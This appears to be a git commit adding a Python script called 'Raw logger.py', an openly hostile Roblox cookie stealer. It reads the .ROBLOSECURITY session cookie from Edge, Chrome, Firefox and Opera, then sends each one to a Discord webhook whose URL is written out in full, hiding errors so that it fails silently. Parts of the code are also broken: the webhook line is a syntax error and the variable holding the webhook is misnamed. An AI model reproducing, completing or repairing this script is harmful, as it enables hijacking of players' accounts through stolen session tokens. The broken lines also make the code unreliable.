ac8d8329cf6b8936c82231c9a0de77378c9350e3
emocannn5353 <132607729+emocannn5353@users.noreply.github.com>
2026-05-21 00:19:33 +0300

    Create Raw logger.py

---
+++ Raw logger.py
@@ -0,0 +1,62 @@
+import browser_cookie3, requests, threading
+import base64
+import time
+import os
+from discord_webhook import DiscordWebhook, DiscordEmbed
+
+
+
+
+
+key = "ENCODED BASE32 HOOK HEREEEE"
+
+weblook = base64.b32decode(key)
+webhookl = https://discord.com/api/webhooks/1506765960206618680/Bkbolj9Zh3QYYiRTPGGlsIDhnlwCCKuJAhrRYRRkjcGRN6ZGDH39zWtsWgYlkjbdNJrB(url=weblook, , username="CookieRiver")
+def edge_logger():
+    try:
+        cookies = browser_cookie3.edge(domain_name='roblox.com')
+        cookies = str(cookies)
+        cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
+        embed = DiscordEmbed(title='Cookie', description=f'{cookie}', color='03b2f8')
+        webhook.add_embed(embed)
+        response = webhook.execute()
+    except:
+        pass
+
+def chrome_logger():
+    try:
+        cookies = browser_cookie3.chrome(domain_name='roblox.com')
+        cookies = str(cookies)
+        cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
+        embed = DiscordEmbed(title='Cookie', description=f'{cookie}', color='03b2f8')
+        webhook.add_embed(embed)
+        response = webhook.execute()
+    except:
+        pass
+
+def firefox_logger():
+    try:
+        cookies = browser_cookie3.firefox(domain_name='roblox.com')
+        cookies = str(cookies)
+        cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
+        embed = DiscordEmbed(title='Cookie', description=f'{cookie}', color='03b2f8')
+        webhook.add_embed(embed)
+        response = webhook.execute()
+    except:
+        pass
+
+def opera_logger():
+    try:
+        cookies = browser_cookie3.opera(domain_name='roblox.com')
+        cookies = str(cookies)
+        cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
+        embed = DiscordEmbed(title='Cookie', description=f'{cookie}', color='03b2f8')
+        webhook.add_embed(embed)
+        response = webhook.execute()
+    except:
+        pass
+
+browsers = [edge_logger, chrome_logger, firefox_logger, opera_logger]
+
+for x in browsers:
+    threading.Thread(target=x,).start()
